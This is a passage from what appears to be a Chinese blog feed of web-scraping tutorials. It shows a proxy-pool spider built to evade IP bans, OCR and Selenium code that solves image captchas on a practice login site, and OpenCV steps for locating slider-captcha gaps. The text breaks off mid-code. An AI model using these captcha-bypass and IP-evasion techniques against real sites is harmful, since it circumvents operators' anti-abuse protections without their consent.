class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        start request</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.session.headers.update(HEADERS)</span><br><span class="line">        start_url = BASE_URL</span><br><span class="line">        request = MovieRequest(</span><br><span class="line">            url=start_url, callback=self.parse_index)</span><br><span class="line">        <span class="comment"># schedule first request</span></span><br><span class="line">        self.queue.add(request)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先定义了全局变量，分别表示目标网站 URL 和请求头。在 Spider 类中初始化了 Session 对象和 RedisQueue 对象，然后定义了获取代理方法，其中使用 loguru.catch 方法作为装饰器来捕获请求代理失败后报错信息。start 方法作为负责请求，其中的 parse_index 为请求成功后处理和解析结果的方法。</p><p>最后，还需要一个调度方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">schedule</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    schedule request</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> self.queue.empty():</span><br><span class="line">        request = self.queue.pop()</span><br><span class="line">        callback = request.callback</span><br><span class="line">        logger.debug(<span class="string">f&#x27;executing request <span class="subst">&#123;request.url&#125;</span>&#x27;</span>)</span><br><span class="line">        response = self.request(request)</span><br><span class="line">        logger.debug(<span class="string">f&#x27;response status <span class="subst">&#123;response&#125;</span> of <span class="subst">&#123;request.url&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> response <span class="keyword">or</span> <span class="keyword">not</span> response.status_code <span class="keyword">in</span> VALID_STATUSES:</span><br><span class="line">            self.error(request)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        results = <span class="built_in">list</span>(callback(response))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> results:</span><br><span class="line">            self.error(request)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(result, MovieRequest):</span><br><span class="line">                logger.debug(<span class="string">f&#x27;generated new request <span class="subst">&#123;result.url&#125;</span>&#x27;</span>)</span><br><span class="line">                self.queue.add(result)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(result, <span class="built_in">dict</span>):</span><br><span class="line">                logger.debug(<span class="string">f&#x27;scraped new data <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解析列表页和详情页的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_index</span>(<span class="params">self, response</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    parse index page</span></span><br><span class="line"><span class="string">    :param response: response</span></span><br><span class="line"><span class="string">    :return: new request</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    doc = pq(response.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># request for detail</span></span><br><span class="line">    items = doc(<span class="string">&#x27;.item .name&#x27;</span>).items()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        detail_url = urljoin(BASE_URL, item.attr(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">        request = MovieRequest(</span><br><span class="line">            url=detail_url, callback=self.parse_detail)</span><br><span class="line">        <span class="keyword">yield</span> request</span><br><span class="line"></span><br><span class="line">    <span class="comment"># request for next page</span></span><br><span class="line">    next_href = doc(<span class="string">&#x27;.next&#x27;</span>).attr(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> next_href:</span><br><span class="line">        next_url = urljoin(BASE_URL, next_href)</span><br><span class="line">        request = MovieRequest(</span><br><span class="line">            url=next_url, callback=self.parse_index)</span><br><span class="line">        <span class="keyword">yield</span> request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span>(<span class="params">self, response</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    parse detail</span></span><br><span class="line"><span class="string">    :param response: response of detail</span></span><br><span class="line"><span class="string">    :return: data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    doc = pq(response.text)</span><br><span class="line">    cover = doc(<span class="string">&#x27;img.cover&#x27;</span>).attr(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">    name = doc(<span class="string">&#x27;a &gt; h2&#x27;</span>).text()</span><br><span class="line">    categories = [item.text()</span><br><span class="line">                  <span class="keyword">for</span> item <span class="keyword">in</span> doc(<span class="string">&#x27;.categories button span&#x27;</span>).items()]</span><br><span class="line">    published_at = doc(<span class="string">&#x27;.info:contains(上映)&#x27;</span>).text()</span><br><span class="line">    published_at = re.search(<span class="string">&#x27;(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)&#x27;</span>, published_at).group(<span class="number">1</span>) \</span><br><span class="line">        <span class="keyword">if</span> published_at <span class="keyword">and</span> re.search(<span class="string">&#x27;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;&#x27;</span>, published_at) <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    drama = doc(<span class="string">&#x27;.drama p&#x27;</span>).text()</span><br><span class="line">    score = doc(<span class="string">&#x27;p.score&#x27;</span>).text()</span><br><span class="line">    score = <span class="built_in">float</span>(score) <span class="keyword">if</span> score <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">yield</span> &#123;</span><br><span class="line">        <span class="string">&#x27;cover&#x27;</span>: cover,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;categories&#x27;</span>: categories,</span><br><span class="line">        <span class="string">&#x27;published_at&#x27;</span>: published_at,</span><br><span class="line">        <span class="string">&#x27;drama&#x27;</span>: drama,</span><br><span class="line">        <span class="string">&#x27;score&#x27;</span>: score</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>部分运行结果如下：</p><p><img data-src="https://s2.loli.net/2022/03/05/wKRIDJmBjVhF6z4.png"></p><p>运行过程中可能会出现以下报错，暂未合适解决方法，将代理设置中的 https 部分注释掉可保证运行：</p><p><img data-src="https://s2.loli.net/2022/03/05/cREJSrApfuwMVXs.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">proxy = self.get_proxy()</span><br><span class="line">logger.debug(<span class="string">f&#x27;get proxy <span class="subst">&#123;proxy&#125;</span>&#x27;</span>)</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://&#x27;</span> + proxy,</span><br><span class="line">    <span class="comment"># &#x27;https&#x27;: &#x27;https://&#x27; + proxy,</span></span><br><span class="line">&#125; <span class="keyword">if</span> proxy <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">print(<span class="string">&#x27;proxy: &#x27;</span>, proxies)</span><br><span class="line">print(<span class="string">&#x27;res&#x27;</span>, request.prepare())</span><br><span class="line"><span class="keyword">return</span> self.session.send(request.prepare(),</span><br><span class="line">                         timeout=request.timeout,</span><br><span class="line">                         proxies=proxies)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/03/02/1xVdOgkM3P5HBRX.png&quot; style=&quot;zoom:67%;&quot; /&gt;

&lt;p&gt;一些网站服务器会检测某个 IP 在单位时间内的请求次数，如果超过了指定的阈值，会直接拒绝服务。本章介绍代理池的搭建方法，解决爬虫封 IP 的烦恼。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记八 -- 验证码的识别</title>
    <link href="https://speedpromise.github.io/archives/410e6558.html"/>
    <id>https://speedpromise.github.io/archives/410e6558.html</id>
    <published>2022-03-01T08:07:02.000Z</published>
    <updated>2022-03-05T02:45:33.146Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/02/15/2z4tLguB3OP8nN6.png" style="zoom:67%;" /><p>本章学习验证码的识别，不同验证码的识别方式和思路有所不同，有的用图像处理库即可，有的则需要借助深度学习技术，还有的需要借助一些工具和平台完成，学完后要进行举一反三，灵活应对不同场景。</p><span id="more"></span><h3 id="使用-OCR-技术识别图形验证码"><a href="#使用-OCR-技术识别图形验证码" class="headerlink" title="使用 OCR 技术识别图形验证码"></a>使用 OCR 技术识别图形验证码</h3><p>首先需要安装 <a href="http://digi.bib.uni-mannheim.de/tesseract/">tesserocr</a>，并将安装路径加入系统环境变量中，Python 库主要用到 tesserocr 库，同时还要安装 Selenium、Pillow、Numpy 和 retrying 库，用来模拟登录、处理图像和重试操作，基本操作如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tesserocr</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\Pro\Desktop\captcha.png&#x27;</span>)</span><br><span class="line">result = tesserocr.image_to_text(image)</span><br><span class="line"><span class="comment"># result = tesserocr.file_to_text(r&#x27;C:\Users\Pro\Desktop\captcha.png&#x27;)   # 可直接选取图片</span></span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">&gt;&gt; d241</span><br></pre></td></tr></table></figure><p>图片中如果有干扰的多余的污点，为保证准确度，需做额外处理。仔细看可发现，那些干扰的点颜色大多比文本颜色浅，可以通过颜色来排除掉。</p><p><img data-src="https://s2.loli.net/2022/03/01/KmIDWdjkcvlELpf.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tesserocr</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\Pro\Desktop\captcha2.png&#x27;</span>)</span><br><span class="line">print(np.array(image).shape)</span><br><span class="line">print(image.mode)</span><br><span class="line">result = tesserocr.image_to_text(image)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line">(<span class="number">38</span>, <span class="number">112</span>, <span class="number">4</span>)</span><br><span class="line">RGBA</span><br><span class="line">-b32d</span><br></pre></td></tr></table></figure><p>38 和 112 表示宽高，4 是像素点的表示向量，下面输出的 mode 也表明这是一个有透明通道的真彩色类型，mode 属性共有9中类型：</p><ul><li>1：像素用 1 位表示，Python 中表示为 True 或 False，即二值化；</li><li>L：像素用 8 位表示，取值 0~255，表示灰度图像，数字越小，颜色越黑；</li><li>P：像素用 8 位表示，即调色板数据；</li><li>RGB：像素用 3*8 位表示，即真彩色；</li><li>RGBA：像素用 4*8 位表示，即有透明通道的真彩色；</li><li>CMYK：像素用 4*8 位表示，即印刷四色模式；</li><li>YCbCr：像素用 3*8 位表示，即彩色视频格式；</li><li>I：像素用 32 位整型表示；</li><li>F：像素用 32 位浮点型表示；</li></ul><p>我们可以把 RGBA 转化成更简单的 L，即灰度图像，也可以做二值化处理，代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image = image.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">image = image.convert(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>对上图有干扰点的图进行去噪处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tesserocr</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\Pro\Desktop\CrackImageCaptcha-master\captcha2.png&#x27;</span>)</span><br><span class="line">image = image.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">threshold = <span class="number">50</span>  <span class="comment"># 灰度阈值</span></span><br><span class="line">array = np.array(image)</span><br><span class="line">array = np.where(array &gt;threshold, <span class="number">255</span>, <span class="number">0</span>)  <span class="comment"># 灰度大于阈值的设为 255，否则 0</span></span><br><span class="line">image = Image.fromarray(array.astype(<span class="string">&#x27;uint8&#x27;</span>))</span><br><span class="line">image.show()</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/01/lrpSjXCNdx2uU4P.png"></p><p>可以看到效果不错，再次识别是正确的。下面来测试一个<a href="https://captcha7.scrape.center/">示例网页</a>，账号密码都是 admin</p><p><img data-src="https://s2.loli.net/2022/03/01/a7yt3whvZePsbqm.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tesserocr</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阈值根据实际测试结果来调节，像素数值越小越黑</span></span><br><span class="line">threshold = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess</span>(<span class="params">image</span>):</span></span><br><span class="line">    image = image.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    array = np.array(image)</span><br><span class="line">    array = np.where(array &gt; threshold, <span class="number">255</span>, <span class="number">0</span>)</span><br><span class="line">    image = Image.fromarray(array.astype(<span class="string">&#x27;uint8&#x27;</span>))</span><br><span class="line">    <span class="comment"># image.show()</span></span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># retry 重试模块，第一个参数表示最大重试次数，第二个接收函数返回值，根据指定函数来决定是否重试</span></span><br><span class="line"><span class="meta">@retry(<span class="params">stop_max_attempt_number=<span class="number">10</span>, retry_on_result=<span class="keyword">lambda</span> x: x <span class="keyword">is</span> <span class="literal">False</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    browser.get(<span class="string">&#x27;https://captcha7.scrape.center/&#x27;</span>)</span><br><span class="line">    browser.find_element(By.CSS_SELECTOR, <span class="string">&#x27;.username input[type=&quot;text&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">    browser.find_element(By.CSS_SELECTOR, <span class="string">&#x27;.password input[type=&quot;password&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">    captcha = browser.find_element(By.CSS_SELECTOR, <span class="string">&#x27;#captcha&#x27;</span>)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(captcha.screenshot_as_png))  <span class="comment"># 获取验证码截图并生成 Image 对象</span></span><br><span class="line">    image = preprocess(image)</span><br><span class="line">    captcha = tesserocr.image_to_text(image)</span><br><span class="line">    captcha = re.sub(<span class="string">&#x27;[^A-Za-z0-9]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, captcha)  <span class="comment"># 去除非法字符</span></span><br><span class="line">    browser.find_element(By.CSS_SELECTOR, <span class="string">&#x27;.captcha input[type=&quot;text&quot;]&#x27;</span>).send_keys(captcha)</span><br><span class="line">    browser.find_element(By.CSS_SELECTOR, <span class="string">&#x27;.login&#x27;</span>).click()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        WebDriverWait(browser, <span class="number">10</span>).until(EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;//h2[contains(.,&quot;登录成功&quot;)]&#x27;</span>)))</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        browser.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    browser = webdriver.Chrome()</span><br><span class="line">    login()</span><br></pre></td></tr></table></figure><p>实际测试效果一般，需要反复调试阈值大小，识别成功率不高。</p><h3 id="使用-OpenCV-识别滑动验证码的缺口"><a href="#使用-OpenCV-识别滑动验证码的缺口" class="headerlink" title="使用 OpenCV 识别滑动验证码的缺口"></a>使用 OpenCV 识别滑动验证码的缺口</h3><p>随着互联网技术的发展，各种新型验证码层出不穷，下面的滑动验证码现在也已经使用很普遍了</p><p><img data-src="https://s2.loli.net/2022/03/01/KsWXGVMwHlohtfJ.png"></p><p>如果要用爬虫自动化完成这一过程，需要识别目标缺口位置，并将滑块拖到缺口位置，第二步操作可以用 Selenium 等自动化工具模拟这个过程，验证并登录后获取对应的 Cookie 或 Token 等信息，但这种方法运行效率较低。也可以直接逆向验证码背后的 JavaScript 逻辑，将缺口信息直接传给 JavaScript 代码，执行获取类似“密钥”信息的操作，再利用“密钥”执行下一步操作。</p><p>本节主要学习使用 OpenCV 技术识别缺口的方法，具体步骤为：</p><ul><li>对验证码图片进行高斯模糊滤波处理，消除部分噪声干扰；</li><li>利用边缘检测算法，通过调整相应阈值识别出验证码图片中滑块的边缘；</li><li>基于上一步得到的各个边缘轮廓信息，对比面积、位置、周长等特征，筛选出最可能的轮廓，得到缺口位置。</li></ul><p>先来了解一些 OpenCV 的基础方法：</p><ul><li><p>高斯滤波</p><p>用来去除图片中的一些噪点，减少干扰，其实就是将图片模糊化，为下步边缘检测做铺垫，OpenCV 提供了实现高斯模糊的方法 <code>def GaussianBlur(src, ksize, sigmaX, dst=None, sigmaY=None, borderType=None)</code></p><ul><li><p>src：需要处理的图片；</p></li><li><p>ksize：高斯滤波处理所用的高斯内核大小，需传入一个元组，包含 x 和 y 两个元素；</p></li><li><p>sigmaX：高斯内核函数在 X 方向上的标准偏差；</p></li><li><p>sigmaY：高斯内核函数在 Y 方向上的标准偏差，若 sigmaY 为 0，就将它设为 sigmaX；若 sigmaX 和 sigmaY 都是 0，就通过 ksize 计算出 sigmaX 和 sigmaY。</p></li></ul><p>ksize 和 sigmaX 是必传参数，经过高斯滤波处理后，图片会变模糊。</p><p><img data-src="https://s2.loli.net/2022/03/01/QRuBa275HEbr8mZ.png"></p></li><li><p>边缘检测</p><p>由于验证码图片里的目标缺口通常具有比较明显的边缘，借助边缘检测算法，再加上调整阈值是可以找出缺口位置的。目前应用较为广泛的算法是 Canny，声明为<code>def Canny(image, threshold1, threshold2, edges=None, apertureSize=None, L2gradient=None)</code></p><ul><li>image：需要处理的图片；</li><li>threshold1、threshold2：分别是最小判定临界点和最大判定临界点；</li><li>apertureSize：用于查找图片渐变的索贝尔内核的大小；</li><li>L2gradient：用于查找梯度幅度的等式。</li></ul><p>通常只需设置 threshold1 和 threshold2 即可，经过算法处理后，会留下一些比较明显的边缘信息。</p><p><img data-src="https://s2.loli.net/2022/03/01/iWs6SMlcLovdNzR.png"></p></li><li><p>轮廓提取</p><p>进行边缘检测处理后，就可以进行轮廓提取，这里用到方法是 <code>def findContours(image, mode, method, contours=None, hierarchy=None, offset=None)</code></p><ul><li>image：需要处理的图片；</li><li>mode：用于定义轮廓的检索模式；</li><li>method：用于定义轮廓的近似方法</li></ul><p>这里将 mode 设置为 RETR_CCOMP，method 设置为 CHAIN_APPROX_SIMPLE，具体选择标准参考官方文档</p></li><li><p>外接矩形</p><p>提取到边缘轮廓后，可以计算出轮廓的外接矩形，以便我们根据面积和周长等参数判断提取的轮廓是否目标缺口轮廓，用到方法是<code>def boundingRect(array)</code>，array 是一个灰度图或 2D 点集。</p></li><li><p>轮廓面积</p><p>外接矩形可能包含我们不想要的目标，可以根据面积和周长来筛选缺口位置，计算面积用到<code>def contourArea(contour, oriented=None)</code></p><ul><li>contour：轮廓信息；</li><li>oriented：方向标识符，默认 False。若取 True，会返回一个带符号的面积值，正负取决于轮廓的方向，取 False，则面积值以绝对值形式返回。</li></ul><p>返回值就是轮廓面积。</p></li><li><p>轮廓周长</p><p><code>def arcLength(curve, closed)</code>，参数分别对应轮廓信息和轮廓是否封闭，返回值是轮廓周长。</p></li></ul><p>下面实现缺口识别算法，已做相应注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">GAUSSIAN_BLUR_KERNEL_SIZE = (<span class="number">5</span>, <span class="number">5</span>)</span><br><span class="line">GAUSSIAN_BLUR_SIGMA_X = <span class="number">0</span></span><br><span class="line">CANNY_THRESHOLD1 = <span class="number">200</span></span><br><span class="line">CANNY_THRESHOLD2 = <span class="number">450</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯模滤波处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gaussian_blur_image</span>(<span class="params">image</span>):</span></span><br><span class="line">    <span class="keyword">return</span> cv2.GaussianBlur(image, GAUSSIAN_BLUR_KERNEL_SIZE, GAUSSIAN_BLUR_SIGMA_X)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 边缘检测处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_canny_image</span>(<span class="params">image</span>):</span></span><br><span class="line">    <span class="keyword">return</span> cv2.Canny(image, CANNY_THRESHOLD1, CANNY_THRESHOLD2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取轮廓信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_contours</span>(<span class="params">image</span>):</span></span><br><span class="line">    contours, _ = cv2.findContours(image, cv2.RETR_CCOMP, cv2.CHAIN_APPROX_SIMPLE)</span><br><span class="line">    <span class="keyword">return</span> contours</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_contour_area_threshold</span>(<span class="params">image_width, image_height</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    得到轮廓信息后，需要根据这些轮廓的外接矩形的面积和周长来筛选出结果，可以预先设定一个范围，</span></span><br><span class="line"><span class="string">    经过实际测量得出目标缺口的外接矩形的高度大约是验证码高度的 0.25 倍，宽度约是 0.15 倍，在</span></span><br><span class="line"><span class="string">    允许误差 20% 情况下，可计算出面积和周长的取值范围。同时缺口位置（左侧）有一个最小偏移量和</span></span><br><span class="line"><span class="string">    一个最大偏移量，最小偏移量是验证码宽度的 0.2 倍，最大是 0.85 倍，综合信息，可以定义 3 个</span></span><br><span class="line"><span class="string">    阈值方法</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    contour_area_min = (image_width * <span 